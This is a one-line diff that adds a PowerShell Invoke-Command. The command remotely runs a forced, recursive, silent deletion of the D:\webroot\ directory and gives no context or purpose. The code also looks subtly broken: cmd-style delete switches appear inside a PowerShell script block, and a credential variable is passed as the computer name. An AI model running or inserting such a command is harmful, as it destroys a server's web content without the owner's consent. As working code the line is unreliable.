@@ -1,0 +1,1 @@
+Invoke-Command -ScriptBlock {del /f/s/q D:\webroot\ > nul} -ComputerName $Credential
